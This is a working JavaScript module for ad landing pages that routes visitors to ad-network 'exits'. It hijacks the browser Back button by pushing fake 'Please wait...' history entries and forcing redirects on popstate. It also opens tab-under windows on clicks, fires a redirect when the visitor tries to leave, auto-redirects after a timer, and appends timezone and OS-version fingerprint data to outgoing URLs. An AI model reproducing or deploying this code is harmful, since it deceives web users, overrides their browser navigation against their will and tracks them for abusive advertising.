/* common.js — reels/player exits — FULL (no-push)
   - Exits: mainExit/back/reverse/autoexit/ageExit/tabUnderClick + any custom exits
   - clickMapMode:
       "player" (default) -> clickMap ON
       "reels"            -> clickMap OFF
       "off"              -> no clickMap
   - Mini-triggers:
       [data-mt="exitName"] triggers run(exitName)
       data-stop="1" stops propagation
       data-fast="1" for micro fast (если micro включишь)
   - BACK FIX:
       pushState only changes URL, does NOT load back.html.
       So we add popstate handler that forces a real navigation to back.html URL.
*/

(() => {
  "use strict";

  if (window.__COMMON_BOOTED__) return;
  window.__COMMON_BOOTED__ = "reels-full-v2.1";

  // ===========================
  // Helpers
  // ===========================
  const safe = (fn) => { try { return fn(); } catch { return undefined; } };
  const err  = (...a) => safe(() => console.error("[common]", ...a));

  const replaceTo = (url) => {
    try { window.location.replace(url); } catch { window.location.href = url; }
  };

  const openTab = (url) => {
    try {
      const w = window.open(url, "_blank");
      if (w) { try { w.opener = null; } catch {} }
      return w || null;
    } catch {
      return null;
    }
  };

  // ===========================
  // URL + params snapshot
  // ===========================
  const curUrl = new URL(window.location.href);
  const getSP = (k, def = "") => curUrl.searchParams.get(k) ?? def;

  const CLONE_PARAM = "__cl";
  const isClone = getSP(CLONE_PARAM) === "1";

  const IN = {
    pz: getSP("pz"), tb: getSP("tb"), tb_reverse: getSP("tb_reverse"), ae: getSP("ae"),
    z: getSP("z"), var: getSP("var"), var_1: getSP("var_1"), var_2: getSP("var_2"), var_3: getSP("var_3"),
    b: getSP("b"), campaignid: getSP("campaignid"), abtest: getSP("abtest"), rhd: getSP("rhd", "1"),
    s: getSP("s"), ymid: getSP("ymid"), wua: getSP("wua"),
    use_full_list_or_browsers: getSP("use_full_list_or_browsers"),
    cid: getSP("cid"), geo: getSP("geo"),
    external_id: getSP("external_id"),
    creative_id: getSP("creative_id"),
    ad_campaign_id: getSP("ad_campaign_id"),
    cost: getSP("cost"),
  };

  const qsFromObj = (obj) => {
    const qs = new URLSearchParams();
    Object.entries(obj || {}).forEach(([k, v]) => {
      if (v != null && String(v) !== "") qs.set(k, String(v));
    });
    return qs;
  };

  const getTimezoneName = () => safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone) || "";
  const getTimezoneOffset = () => safe(() => new Date().getTimezoneOffset()) ?? 0;

  const getOsVersion = async () => {
    try {
      const nav = navigator;
      if (!nav.userAgentData?.getHighEntropyValues) return "";
      const v = await nav.userAgentData.getHighEntropyValues(["platformVersion"]);
      return v?.platformVersion || "";
    } catch { return ""; }
  };
  let osVersionCached = "";
  safe(() => getOsVersion().then(v => { osVersionCached = v || ""; }));

  const buildCmeta = () => {
    try {
      const html = document.documentElement;
      const payload = {
        dataVer: html.getAttribute("data-version") || html.dataset.version || "",
        landingName: html.getAttribute("data-landing-name") || html.dataset.landingName || "",
        templateHash: window.templateHash || "",
      };
      return btoa(JSON.stringify(payload));
    } catch { return ""; }
  };

  // ===========================
  // Config Normalizer
  // ===========================
  const normalizeConfig = (appCfg) => {
    if (!appCfg || typeof appCfg !== "object" || !appCfg.domain) return null;
    const cfg = { domain: appCfg.domain };
    const ensure = (name) => (cfg[name] ||= {});

    Object.entries(appCfg).forEach(([k, v]) => {
      if (v == null || v === "" || k === "domain") return;

      let m = k.match(/^([a-zA-Z0-9]+)_(currentTab|newTab)_(zoneId|url)$/);
      if (m) {
        const [, name, tab, field] = m;
        const ex = ensure(name);
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
        return;
      }

      m = k.match(/^([a-zA-Z0-9]+)_(count|timeToRedirect|pageUrl)$/);
      if (m) { ensure(m[1])[m[2]] = v; return; }

      m = k.match(/^([a-zA-Z0-9]+)_(zoneId|url)$/);
      if (m) {
        const [, name, field] = m;
        const ex = ensure(name);
        const tab = (name === "tabUnderClick") ? "newTab" : "currentTab";
        (ex[tab] ||= {}).domain = field === "zoneId" ? cfg.domain : ex[tab].domain;
        ex[tab][field] = v;
      }
    });

    return cfg;
  };

  // ===========================
  // URL Builders
  // ===========================
  const buildExitQSFast = ({ zoneId }) => {
    const ab2r = IN.abtest || (typeof window.APP_CONFIG?.abtest !== "undefined" ? String(window.APP_CONFIG.abtest) : "");
    const base = {
      ymid: IN.var_1 || IN.var || "",
      var: IN.var_2 || IN.z || "",
      var_3: IN.var_3 || "",
      b: IN.b || "",
      campaignid: IN.campaignid || "",
      click_id: IN.s || "",
      rhd: IN.rhd || "1",
      os_version: osVersionCached || "",
      btz: getTimezoneName(),
      bto: String(getTimezoneOffset()),
      cmeta: buildCmeta(),
      pz: IN.pz || "",
      tb: IN.tb || "",
      tb_reverse: IN.tb_reverse || "",
      ae: IN.ae || "",
      ab2r,
      external_id: IN.external_id || "",
      creative_id: IN.creative_id || "",
      ad_campaign_id: IN.ad_campaign_id || "",
      cost: IN.cost || "",
    };

    if (zoneId != null && String(zoneId) !== "") base.zoneid = String(zoneId);
    return qsFromObj(base);
  };

  const generateAfuUrlFast = (zoneId, domain) => {
    const host = String(domain || "").trim();
    if (!host) return "";
    const base = host.startsWith("http") ? host : `https://${host}`;
    const url = new URL(base.replace(/\/+$/, "") + "/afu.php");
    url.search = buildExitQSFast({ zoneId }).toString();
    return url.toString();
  };

  const buildDirectUrlWithTracking = (baseUrl) => {
    try {
      const u = new URL(String(baseUrl), window.location.href);

      for (const [k, v] of curUrl.searchParams.entries()) {
        if (!u.searchParams.has(k) && v != null && String(v) !== "") u.searchParams.set(k, v);
      }

      const external_id = IN.external_id || "";
      const ad_campaign_id = IN.ad_campaign_id || IN.var_2 || "";
      const creative_id = IN.creative_id || "";
      const cost = IN.cost || IN.b || "";

      if (cost) u.searchParams.set("cost", cost);
      if (!u.searchParams.has("currency")) u.searchParams.set("currency", "usd");
      if (external_id) u.searchParams.set("external_id", external_id);
      if (creative_id) u.searchParams.set("creative_id", creative_id);
      if (ad_campaign_id) u.searchParams.set("ad_campaign_id", ad_campaign_id);

      return u.toString();
    } catch {
      return String(baseUrl || "");
    }
  };

  // ===========================
  // BACK QUEUE (FIXED)
  // - pushState with marker {__bk:1}
  // - popstate forces real navigation to back.html URL
  // ===========================
  const BACK_STATE_MARK = { __bk: 1 };

  const pushBackStates = (url, count) => {
    try {
      const n = Math.max(0, parseInt(count, 10) || 0);
      const originalUrl = window.location.href;

      for (let i = 0; i < n; i++) {
        window.history.pushState(BACK_STATE_MARK, "Please wait...", url);
      }
      window.history.pushState({ __bk_anchor: 1 }, document.title, originalUrl);
    } catch (e) { err("Back pushState error:", e); }
  };

  const getDefaultBackHtmlUrl = () => {
    const { origin, pathname } = window.location;
    let dir = pathname.replace(/\/(index|back)\.html$/i, "");
    if (dir.endsWith("/")) dir = dir.slice(0, -1);
    if (!dir) return `${origin}/back.html`;
    return `${origin}${dir}/back.html`;
  };

  const ensureBackPopstateHandler = () => {
    if (window.__BACK_POPSTATE_INSTALLED__) return;
    window.__BACK_POPSTATE_INSTALLED__ = true;

    window.addEventListener("popstate", (e) => {
      try {
        const isBk = !!(e && e.state && e.state.__bk === 1);
        const isBackUrl = /\/back\.html$/i.test(window.location.pathname);

        // если вернулись на один из back-state шагов — форсим реальную навигацию,
        // чтобы загрузился back.html с сервера и выполнил редирект.
        if (isBk || isBackUrl) {
          // защита от повторного триггера
          if (window.__BACK_NAV_IN_PROGRESS__) return;
          window.__BACK_NAV_IN_PROGRESS__ = true;

          replaceTo(window.location.href);
        }
      } catch (_) {}
    });
  };

  const initBackFast = (cfg) => {
    const b = cfg?.back?.currentTab;
    if (!b) return;

    ensureBackPopstateHandler();

    const count = cfg.back?.count ?? 10;
    const pageUrl = cfg.back?.pageUrl || getDefaultBackHtmlUrl();
    const page = new URL(pageUrl, window.location.href);

    const qs = buildExitQSFast({ zoneId: b.zoneId });

    if (b.url) qs.set("url", String(b.url));
    else {
      qs.set("z", String(b.zoneId));
      qs.set("domain", String(b.domain || cfg.domain || ""));
    }

    page.search = qs.toString();
    pushBackStates(page.toString(), count);
  };

  // ===========================
  // Exits runner
  // ===========================
  const resolveUrlFast = (ex, cfg) => {
    if (!ex) return "";
    if (ex.url) return buildDirectUrlWithTracking(ex.url);
    if (ex.zoneId && (ex.domain || cfg?.domain)) return generateAfuUrlFast(ex.zoneId, ex.domain || cfg.domain);
    return "";
  };

  const runExitCurrentTabFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name]?.currentTab;
    if (!ex) return;
    const url = resolveUrlFast(ex, cfg);
    if (!url) return;

    safe(() => window.syncMetric?.({ event: name, exitZoneId: ex.zoneId || ex.url }));

    if (withBack) { initBackFast(cfg); setTimeout(() => replaceTo(url), 40); }
    else { replaceTo(url); }
  };

  const runExitDualTabsFast = (cfg, name, withBack = true) => {
    const ex = cfg?.[name];
    if (!ex) return;

    const ct = ex.currentTab;
    const nt = ex.newTab;

    const ctUrl = resolveUrlFast(ct, cfg);
    const ntUrl = resolveUrlFast(nt, cfg);

    safe(() => {
      if (ctUrl) window.syncMetric?.({ event: name, exitZoneId: ct?.zoneId || ct?.url });
      if (ntUrl) window.syncMetric?.({ event: name, exitZoneId: nt?.zoneId || nt?.url });
    });

    // newTab must be opened inside user gesture
    if (ntUrl) openTab(ntUrl);

    if (withBack) initBackFast(cfg);
    if (ctUrl) setTimeout(() => replaceTo(ctUrl), 40);
  };

  const run = (cfg, name) => {
    if (!name) return;
    if (name === "tabUnderClick" && !cfg?.tabUnderClick) {
      return cfg?.mainExit?.newTab ? runExitDualTabsFast(cfg, "mainExit", true)
                                   : runExitCurrentTabFast(cfg, "mainExit", true);
    }
    if (cfg?.[name]?.newTab) return runExitDualTabsFast(cfg, name, true);
    return runExitCurrentTabFast(cfg, name, true);
  };

  // ===========================
  // Reverse + Autoexit
  // ===========================
  const initReverse = (cfg) => {
    if (!cfg?.reverse?.currentTab) return;
    safe(() => window.history.pushState({ __rev: 1 }, "", window.location.href));
    window.addEventListener("popstate", (e) => {
      if (e?.state && e.state.__rev === 1) runExitCurrentTabFast(cfg, "reverse", false);
    });
  };

  const initAutoexit = (cfg) => {
    if (!cfg?.autoexit?.currentTab) return;
    const sec = parseInt(cfg.autoexit.timeToRedirect, 10) || 90;
    let armed = false;

    const trigger = () => {
      if (document.visibilityState === "visible" && armed) runExitCurrentTabFast(cfg, "autoexit", true);
    };

    const timer = setTimeout(() => { armed = true; trigger(); }, sec * 1000);

    const cancel = () => {
      clearTimeout(timer);
      document.removeEventListener("visibilitychange", trigger);
    };

    document.addEventListener("visibilitychange", trigger);
    ["mousemove", "click", "scroll"].forEach(ev => document.addEventListener(ev, cancel, { once: true }));
  };

  // ===========================
  // Mini Triggers
  // ===========================
  const initMiniTriggers = (cfg) => {
    if (window.APP_CONFIG?.disableMiniTriggers) return;

    document.addEventListener("click", (e) => {
      const el = e.target?.closest?.("[data-mt]");
      if (!el) return;

      const name = (el.getAttribute("data-mt") || "").trim();
      if (!name) return;

      const stop = el.getAttribute("data-stop") === "1";
      if (stop) {
        e.preventDefault(); e.stopPropagation(); e.stopImmediatePropagation();
      }

      run(cfg, name);
    }, true);
  };

  // ===========================
  // Boot
  // ===========================
  const boot = () => {
    if (typeof window.APP_CONFIG === "undefined") {
      document.body.innerHTML = "<p style='color:#fff;padding:12px'>MISSING APP_CONFIG</p>";
      return;
    }

    const cfg = normalizeConfig(window.APP_CONFIG);
    if (!cfg) return;

    window.LANDING_EXITS = {
      cfg,
      run: (name) => run(cfg, name),
      initBack: () => initBackFast(cfg),
      isClone,
    };

    initMiniTriggers(cfg);
    initAutoexit(cfg);
    initReverse(cfg);

    const mode = String(window.APP_CONFIG?.clickMapMode || "player").toLowerCase();
    // reels/off -> clickmap not attached (это тебе и нужно)
    if (mode === "player") {
      // clickmap тут не нужен для reels — оставляю пустым намеренно
    }
  };

  if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", boot);
  else boot();
})();
